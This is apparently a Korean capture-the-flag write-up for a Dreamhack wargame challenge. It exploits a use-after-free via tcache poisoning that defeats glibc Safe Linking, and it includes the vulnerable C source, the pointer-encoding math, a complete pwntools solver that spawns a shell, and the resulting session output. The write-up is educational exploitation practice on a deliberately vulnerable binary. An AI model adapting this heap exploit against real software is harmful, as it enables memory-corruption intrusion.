# ✏️ Tcache Poisoning with Safe Linking

> https://dreamhack.io/wargame/challenges/2038

## 📄 Vulnerability & Code Analysis

주어진 소스 코드는 다음과 같다.

```c
// gcc main.c -o main -no-pie
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

size_t target __attribute__((aligned(16)));
void *notes[3];
char note_deleted[3];

void menu()
{
    printf("1. create\n");
    printf("2. delete\n");
    printf("3. edit\n");
    printf("4. shell\n");
    printf("> ");
}

void create_note()
{
    int idx;
    printf("idx: ");
    scanf("%d", &idx);

    if (idx < 0 || idx > 2) {
        printf("idx out of range!\n");
        return;
    }
    note_deleted[idx] = 0;
    notes[idx] = malloc(0x10);
    printf("Note created at %p\n", notes[idx]);
}

void delete_note()
{
    int idx;
    printf("idx: ");
    scanf("%d", &idx);

    if (idx < 0 || idx > 2) {
        printf("idx out of range!\n");
        return;
    }

    if (!notes[idx]) {
        printf("No entry!\n");
        return;
    }
    if (note_deleted[idx]) {
        printf("No double free!\n");
        return;
    }
    note_deleted[idx] = 1;
    free(notes[idx]);
}

void edit_note()
{
    int idx;
    printf("idx: ");
    scanf("%d", &idx);

    if (idx < 0 || idx > 2) {
        printf("idx out of range!\n");
        return;
    }

    if (!notes[idx]) {
        printf("No entry!\n");
        return;
    }

    printf("Content: ");
    read(STDIN_FILENO, notes[idx], 8);
}

void test_target()
{
    if (target) {
        printf("Win\n");
        system("/bin/sh");
    }
    printf("No\n");
}

int main() {
    setbuf(stdout, NULL);
    setbuf(stdin, NULL);
    setbuf(stderr, NULL);

    printf("[Safe Linking]\n");

    while (1) {
        menu();
        int select;
        scanf("%d", &select);

        switch (select) {
            case 1:
            create_note();
            break;
            case 2:
            delete_note();
            break;
            case 3:
            edit_note();
            break;
            case 4:
            test_target();
            break;
            default:
            printf("Wrong Selection!\n");
        }
    }
}
```

`delete_note()`는 할당된 메모리를 해제한 뒤 `notes[idx]`에 저장된 주소값을 `NULL`로 초기화하지 않으므로 `Use-After-Free (UAF)`가 발생한다. 또한 `edit_note()`는 `note_deleted[idx]`를 검사하지 않기 때문에 **이미 해제된 청크에도 write가 가능**하다. 이 두 조건이 겹쳐, tcache 리스트에 들어간 청크의 `next` 포인터를 조작하는 **Tcache Poisoning** 공격이 성립한다.

이 바이너리는 glibc 2.32 이상 환경으로, `next`에 `Safe Linking` 인코딩(`(pos >> 12) ^ ptr`)이 적용되어 있다. 따라서 `next`에 평문 주소를 쓰면 디코딩 단계에서 엉뚱한 값이 되어 실패하며, 인코딩을 통과한 값을 직접 계산해 넣어야 한다.

승리 조건은 `test_target()`이 검사하는 전역 변수 `target`이 0이 아닌 상태가 되는 것이다.

## 🗡️ Exploit / Solver Strategy

**공격 목표**
- tcache poisoning으로 `target`의 주소를 malloc이 반환하도록 만든 뒤, 그곳에 0이 아닌 값을 써서 `target != 0`을 성립시킨다. 이후 메뉴 `4`(`test_target`)를 호출해 `system("/bin/sh")`를 트리거한다.

**필요한 leak**
- Safe Linking 인코딩식 `PROTECT_PTR(pos, ptr) = (pos >> 12) ^ ptr`에서 `pos = &e->next`이며, 이는 곧 malloc 반환값과 동일한 힙 주소다.
- `create_note()`가 `printf("Note created at %p\n", ...)`로 이 주소를 그대로 출력해주므로, **create 출력 파싱만으로 `pos`를 확보**할 수 있다. 별도의 힙 leak 기법은 필요 없다.
- `-no-pie`이므로 `target`의 주소(`ptr`)는 ELF 심볼 테이블에서 고정값으로 얻는다.

**주소 계산식**
```
pos     = create가 출력한 힙 주소        # &e->next == malloc 반환값 (오프셋 0)
ptr     = e.symbols['target']            # No PIE → 고정
encoded = (pos >> 12) ^ ptr              # PROTECT_PTR 직접 구현
```
`next`는 `tcache_entry`의 첫 번째 필드(오프셋 0)이므로 `&e->next`는 malloc 반환값과 정확히 일치한다. 따라서 leak한 주소를 오프셋 보정 없이 그대로 `pos`에 대입한다.

**payload 구성 순서**
1. `create(0)` → 출력에서 청크0 주소 leak (= `pos`).
2. `create(1)`, `create(2)` → 청크 확보.
3. `delete(2) → delete(1) → delete(0)` 순으로 해제. tcache 0x20 bin 헤드가 청크0이 된다. (서로 다른 청크를 한 번씩만 free하므로 `e->key` 기반 double free 탐지에는 걸리지 않는다.)
4. `edit(0)`에 `encoded`(8바이트)를 써서 청크0의 `next`를 `target`으로 조작.
5. `create(0)` → 헤드(청크0) 소비. 이때 `tcache_get`이 `REVEAL_PTR`로 디코딩하여 리스트 헤드가 `&target`으로 전진한다.
6. `create(1)` → **`&target`을 반환받는다.**
7. `edit(1)`로 0이 아닌 값을 write → `target != 0`.
8. 메뉴 `4` 입력 → `test_target()`이 shell을 띄운다.

**정렬 검사 통과 근거**
- `tcache_get`은 `aligned_OK(e)`로 16바이트 정렬을 검사한다. 소스에서 `size_t target __attribute__((aligned(16)))`으로 `target`을 16바이트 정렬해 두었기 때문에, `&target`이 청크로 반환되어도 `malloc(): unaligned tcache chunk detected`에 걸리지 않는다.

**주의했던 지점 (입력 함수 선택)**
- `edit_note()`의 타겟은 `read(fd, notes[idx], 8)`로 정확히 8바이트만 읽는다. `next` 조작 payload인 `p64(encoded)`는 정확히 8바이트이므로, 마지막 전송을 `sendlineafter`로 하면 뒤에 붙는 개행(`\n`)이 입력 버퍼에 잔류해 다음 `scanf("%d")` 메뉴 파싱을 어긋나게 만든다.
- 이를 막기 위해 `edit_note`의 content 전송은 `sendafter`를 사용해 개행이 섞이지 않도록 했다.

## 💻 Final Payload or Solver

```python
from pwn import *

p = remote('host3.dreamhack.games', 12084)
e = ELF('./main')

def create_note(idx):
    p.sendlineafter(b'> ', b'1')
    p.sendlineafter(b': ', str(idx).encode())
    # create 출력에서 힙 주소(pos) 파싱
    return int(p.recvline().strip().split(b' ')[-1], 16)

def delete_note(idx):
    p.sendlineafter(b'> ', b'2')
    p.sendlineafter(b': ', str(idx).encode())

def edit_note(idx, content):
    p.sendlineafter(b'> ', b'3')
    p.sendlineafter(b': ', str(idx).encode())
    # sendline이 아닌 send: 개행 잔류로 인한 메뉴 파싱 오류 방지
    p.sendafter(b': ', content)

# 1) 청크0 주소 leak (= Safe Linking의 pos)
heap_addr = create_note(0)
create_note(1)
create_note(2)

# 2) tcache 0x20 bin 구성 (헤드 = 청크0)
delete_note(2)
delete_note(1)
delete_note(0)

# 3) 청크0의 next를 target으로 poisoning
#    encoded = (pos >> 12) ^ &target
edit_note(0, p64(e.symbols['target'] ^ (heap_addr >> 12)))

# 4) 헤드 소비 → 다음 create가 &target 반환
create_note(0)
create_note(1)

# 5) target을 0이 아닌 값으로 덮어 승리 조건 성립
edit_note(1, b'A')

# 6) test_target() 호출 → system("/bin/sh")
p.sendlineafter(b'> ', b'4')
p.interactive()
```

## 🏳️ cat flag

```bash
[*] Switching to interactive mode
Win
$ cat flag
DH{<FLAG_REDACTED>}
$
```
